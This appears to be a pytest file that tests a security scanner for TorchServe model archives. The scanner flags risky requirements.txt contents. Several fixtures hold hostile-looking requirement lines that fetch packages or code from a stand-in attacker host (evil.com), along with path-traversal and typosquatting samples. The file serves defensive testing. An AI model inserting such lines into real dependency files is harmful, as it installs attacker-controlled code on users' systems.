def test_scan_analyzes_local_included_requirements_files(tmp_path: Path) -> None:
    manifest = {"model": {"handler": "handler.py", "serializedFile": "weights.bin"}}
    mar_path = _create_mar_archive(
        tmp_path,
        manifest=manifest,
        entries={
            "handler.py": b"def handle(data, context):\n    return {'ok': True}\n",
            "weights.bin": b"weights",
            "requirements.txt": b"-r extra.txt\n",
            "extra.txt": b"--index-url=https://evil.com/simple\n",
        },
        filename="requirements_local_include.mar",
    )

    result = TorchServeMarScanner().scan(str(mar_path))
    requirements_failures = _failed_checks(result, "TorchServe Requirements Supply Chain Analysis")

    assert len(requirements_failures) == 1
    assert requirements_failures[0].severity == IssueSeverity.CRITICAL
    assert any(
        finding["reason"] == "non_pypi_index_url" and finding["requirements_file"] == "extra.txt"
        for finding in requirements_failures[0].details.get("findings", [])
    )


def test_scan_flags_colliding_local_requirements_include_even_when_benign_alias_is_last(tmp_path: Path) -> None:
    manifest = {"model": {"handler": "handler.py", "serializedFile": "weights.bin"}}
    mar_path = _create_mar_archive(
        tmp_path,
        manifest=manifest,
        entries=[
            ("handler.py", b"def handle(data, context):\n    return {'ok': True}\n"),
            ("weights.bin", b"weights"),
            ("requirements.txt", b"-r extra.txt\n"),
            ("extra.txt", b"git+https://evil.com/repo#egg=evilpkg\n"),
            ("subdir/../extra.txt", b"numpy==1.26.4\n"),
        ],
        filename="requirements_local_include_collision_override.mar",
    )

    result = TorchServeMarScanner().scan(str(mar_path))
    requirements_failures = _failed_checks(result, "TorchServe Requirements Supply Chain Analysis")

    assert len(requirements_failures) == 1
    assert any(
        finding["reason"] == "git_install" and finding["requirements_file"] == "extra.txt"
        for finding in requirements_failures[0].details.get("findings", [])
    )


def test_scan_follows_local_requirements_include_beyond_entry_processing_cap(tmp_path: Path) -> None:
    manifest = {"model": {"handler": "handler.py", "serializedFile": "weights.bin"}}
    mar_path = _create_mar_archive(
        tmp_path,
        manifest=manifest,
        entries=[
            ("handler.py", b"def handle(data, context):\n    return {'ok': True}\n"),
            ("weights.bin", b"weights"),
            ("requirements.txt", b"-r extra.txt\n"),
            ("extra.txt", b"git+https://evil.com/repo#egg=evilpkg\n"),
        ],
        filename="requirements_include_after_entry_cap.mar",
    )

    result = TorchServeMarScanner(config={"max_mar_entries": 4}).scan(str(mar_path))

    entry_limit_failures = _failed_checks(result, "TorchServe MAR Entry Limit")
    requirements_failures = _failed_checks(result, "TorchServe Requirements Supply Chain Analysis")

    assert len(entry_limit_failures) == 1
    assert len(requirements_failures) == 1
    assert any(
        finding["reason"] == "git_install" and finding["requirements_file"] == "extra.txt"
        for finding in requirements_failures[0].details.get("findings", [])
    )


def test_scan_accepts_clean_colliding_local_requirements_include_aliases(tmp_path: Path) -> None:
    manifest = {"model": {"handler": "handler.py", "serializedFile": "weights.bin"}}
    mar_path = _create_mar_archive(
        tmp_path,
        manifest=manifest,
        entries=[
            ("handler.py", b"def handle(data, context):\n    return {'ok': True}\n"),
            ("weights.bin", b"weights"),
            ("requirements.txt", b"-r extra.txt\n"),
            ("extra.txt", b"numpy==1.26.4\n"),
            ("subdir/../extra.txt", b"torch==2.2.2\n"),
        ],
        filename="requirements_local_include_collision_clean.mar",
    )

    result = TorchServeMarScanner().scan(str(mar_path))
    requirements_checks = _checks_named(result, "TorchServe Requirements Supply Chain Analysis")

    assert len(requirements_checks) == 1
    assert requirements_checks[0].status == CheckStatus.PASSED


@pytest.mark.parametrize(
    ("requirements_line", "filename"),
    [
        ("-r ../outside.txt\n", "requirements_parent_relative_include.mar"),
        ("-r /workspace/outside.txt\n", "requirements_absolute_include.mar"),
        ("-r file:///workspace/outside.txt\n", "requirements_file_url_include.mar"),
    ],
)
def test_scan_flags_external_local_requirements_include_as_warning(
    tmp_path: Path,
    requirements_line: str,
    filename: str,
) -> None:
    manifest = {"model": {"handler": "handler.py", "serializedFile": "weights.bin"}}
    mar_path = _create_mar_archive(
        tmp_path,
        manifest=manifest,
        entries={
            "handler.py": b"def handle(data, context):\n    return {'ok': True}\n",
            "weights.bin": b"weights",
            "requirements.txt": requirements_line.encode("utf-8"),
        },
        filename=filename,
    )

    result = TorchServeMarScanner().scan(str(mar_path))
    requirements_failures = _failed_checks(result, "TorchServe Requirements Supply Chain Analysis")

    assert len(requirements_failures) == 1
    assert requirements_failures[0].severity == IssueSeverity.WARNING
    assert any(
        finding["reason"] == "external_requirements_include"
        for finding in requirements_failures[0].details.get("findings", [])
    )


def test_scan_accepts_clean_local_included_requirements_files(tmp_path: Path) -> None:
    manifest = {"model": {"handler": "handler.py", "serializedFile": "weights.bin"}}
    mar_path = _create_mar_archive(
        tmp_path,
        manifest=manifest,
        entries={
            "handler.py": b"def handle(data, context):\n    return {'ok': True}\n",
            "weights.bin": b"weights",
            "requirements.txt": b"-r extras/clean.txt\n",
            "extras/clean.txt": b"numpy==1.26.4\n",
        },
        filename="requirements_clean_local_include.mar",
    )

    result = TorchServeMarScanner().scan(str(mar_path))
    requirements_checks = _checks_named(result, "TorchServe Requirements Supply Chain Analysis")

    assert len(requirements_checks) == 1
    assert requirements_checks[0].status == CheckStatus.PASSED


def test_scan_flags_remote_requirements_include_as_warning(tmp_path: Path) -> None:
    manifest = {"model": {"handler": "handler.py", "serializedFile": "weights.bin"}}
    mar_path = _create_mar_archive(
        tmp_path,
        manifest=manifest,
        entries={
            "handler.py": b"def handle(data, context):\n    return {'ok': True}\n",
            "weights.bin": b"weights",
            "requirements.txt": b"-r https://evil.com/requirements.txt\n",
        },
        filename="requirements_remote_include.mar",
    )

    result = TorchServeMarScanner().scan(str(mar_path))
    requirements_failures = _failed_checks(result, "TorchServe Requirements Supply Chain Analysis")

    assert len(requirements_failures) == 1
    assert requirements_failures[0].severity == IssueSeverity.WARNING
    assert any(
        finding["reason"] == "remote_requirements_include"
        for finding in requirements_failures[0].details.get("findings", [])
    )


def test_scan_flags_direct_url_requirement_as_warning(tmp_path: Path) -> None:
    manifest = {"model": {"handler": "handler.py", "serializedFile": "weights.bin"}}
    mar_path = _create_mar_archive(
        tmp_path,
        manifest=manifest,
        entries={
            "handler.py": b"def handle(data, context):\n    return {'ok': True}\n",
            "weights.bin": b"weights",
            "requirements.txt": b"torch @ https://evil.com/pkg.whl\n",
        },
        filename="requirements_direct_url.mar",
    )

    result = TorchServeMarScanner().scan(str(mar_path))
    requirements_failures = _failed_checks(result, "TorchServe Requirements Supply Chain Analysis")

    assert len(requirements_failures) == 1
    assert requirements_failures[0].severity == IssueSeverity.WARNING
    assert any(
        finding["reason"] == "direct_url_install" for finding in requirements_failures[0].details.get("findings", [])
    )


@pytest.mark.parametrize(
    ("requirements_line", "filename"),
    [
        ("-e.\n", "requirements_editable_current_dir.mar"),
        ("-e./pkg\n", "requirements_editable_pkg_dir.mar"),
    ],
)
def test_scan_flags_concatenated_editable_short_requirements_as_warning(
    tmp_path: Path,
    requirements_line: str,
    filename: str,
) -> None:
    manifest = {"model": {"handler": "handler.py", "serializedFile": "weights.bin"}}
    mar_path = _create_mar_archive(
        tmp_path,
        manifest=manifest,
        entries={
            "handler.py": b"def handle(data, context):\n    return {'ok': True}\n",
            "weights.bin": b"weights",
            "requirements.txt": requirements_line.encode("utf-8"),
        },
        filename=filename,
    )

    result = TorchServeMarScanner().scan(str(mar_path))
    requirements_failures = _failed_checks(result, "TorchServe Requirements Supply Chain Analysis")

    assert len(requirements_failures) == 1
    assert requirements_failures[0].severity == IssueSeverity.WARNING
    assert any(
        finding["reason"] == "editable_install" for finding in requirements_failures[0].details.get("findings", [])
    )


def test_scan_flags_bare_direct_url_with_userinfo_as_warning(tmp_path: Path) -> None:
    manifest = {"model": {"handler": "handler.py", "serializedFile": "weights.bin"}}
    mar_path = _create_mar_archive(
        tmp_path,
        manifest=manifest,
        entries={
            "handler.py": b"def handle(data, context):\n    return {'ok': True}\n",
            "weights.bin": b"weights",
            "requirements.txt": b"https://user:pass@evil.com/pkg.whl\n",
        },
        filename="requirements_bare_userinfo_direct_url.mar",
    )

    result = TorchServeMarScanner().scan(str(mar_path))
    requirements_failures = _failed_checks(result, "TorchServe Requirements Supply Chain Analysis")

    assert len(requirements_failures) == 1
    assert requirements_failures[0].severity == IssueSeverity.WARNING
    assert any(
        finding["reason"] == "direct_url_install" for finding in requirements_failures[0].details.get("findings", [])
    )


def test_scan_ignores_missing_index_url_value(tmp_path: Path) -> None:
    manifest = {"model": {"handler": "handler.py", "serializedFile": "weights.bin"}}
    mar_path = _create_mar_archive(
        tmp_path,
        manifest=manifest,
        entries={
            "handler.py": b"def handle(data, context):\n    return {'ok': True}\n",
            "weights.bin": b"weights",
            "requirements.txt": b"--index-url\nnumpy==1.26.4\n",
        },
        filename="requirements_missing_index_value.mar",
    )

    result = TorchServeMarScanner().scan(str(mar_path))
    requirements_checks = _checks_named(result, "TorchServe Requirements Supply Chain Analysis")

    assert len(requirements_checks) == 1
    assert requirements_checks[0].status == CheckStatus.PASSED


def test_scan_bounds_requirements_reads_to_dedicated_limit(
    tmp_path: Path,
    monkeypatch: pytest.MonkeyPatch,
) -> None:
    manifest = {"model": {"handler": "handler.py", "serializedFile": "weights.bin"}}
    monkeypatch.setattr(TorchServeMarScanner, "MAX_REQUIREMENTS_TXT_BYTES", 128)
    mar_path = _create_mar_archive(
        tmp_path,
        manifest=manifest,
        entries={
            "handler.py": b"def handle(data, context):\n    return {'ok': True}\n",
            "weights.bin": b"weights",
            "requirements.txt": b"a" * 129,
        },
        filename="requirements_oversized.mar",
    )

    result = TorchServeMarScanner(config={"max_mar_member_bytes": 1024 * 1024}).scan(str(mar_path))
    requirements_failures = _failed_checks(result, "TorchServe Requirements Supply Chain Analysis")
    coverage_failures = _failed_checks(result, "TorchServe Requirements Supply Chain Coverage")

    assert requirements_failures == []
    assert len(coverage_failures) == 1
    assert coverage_failures[0].severity == IssueSeverity.INFO
    assert any(
        "exceeds size limit" in member["message"]
        for member in coverage_failures[0].details.get("incomplete_requirements_members", [])
    )
    assert "torchserve_requirements_size_limit" in result.metadata["scan_outcome_reasons"]
    _assert_inconclusive_aggregate_not_cached(
        mar_path,
        "torchserve_requirements_size_limit",
        tmp_path / "requirements-size-cache",
        max_mar_member_bytes=1024 * 1024,
    )


def test_scan_without_requirements_txt_preserves_existing_behavior(tmp_path: Path) -> None:
    manifest = {"model": {"handler": "handler.py", "serializedFile": "weights.bin"}}
    mar_path = _create_mar_archive(
        tmp_path,
        manifest=manifest,
        entries={
            "handler.py": b"def handle(data, context):\n    return {'ok': True}\n",
            "weights.bin": b"weights",
        },
        filename="requirements_missing.mar",
    )

    result = TorchServeMarScanner().scan(str(mar_path))
    requirements_checks = [
        check for check in result.checks if check.name == "TorchServe Requirements Supply Chain Analysis"
    ]
    assert requirements_checks == []


def test_scan_only_analyzes_exact_requirements_txt_filename(tmp_path: Path) -> None:
    manifest = {"model": {"handler": "handler.py", "serializedFile": "weights.bin"}}
    mar_path = _create_mar_archive(
        tmp_path,
        manifest=manifest,
        entries={
            "handler.py": b"def handle(data, context):\n    return {'ok': True}\n",
            "weights.bin": b"weights",
            "myrequirements.txt": b"--index-url=https://evil.com/simple\n",
        },
        filename="requirements_filename_prefix.mar",
    )

    result = TorchServeMarScanner().scan(str(mar_path))
    requirements_checks = [
        check for check in result.checks if check.name == "TorchServe Requirements Supply Chain Analysis"
    ]
    assert requirements_checks == []


def test_scan_detects_typo_package_with_inline_hash_comment(tmp_path: Path) -> None:
    manifest = {"model": {"handler": "handler.py", "serializedFile": "weights.bin"}}
    mar_path = _create_mar_archive(
        tmp_path,
        manifest=manifest,
        entries={
            "handler.py": b"def handle(data, context):\n    return {'ok': True}\n",
            "weights.bin": b"weights",
            "requirements.txt": b"numppy#comment\n",
        },
        filename="requirements_typo_hash_comment.mar",
    )

    result = TorchServeMarScanner().scan(str(mar_path))
    requirements_failures = _failed_checks(result, "TorchServe Requirements Supply Chain Analysis")

    assert len(requirements_failures) == 1
    assert any(
        finding["reason"] == "typosquatting_pattern" for finding in requirements_failures[0].details.get("findings", [])
    )
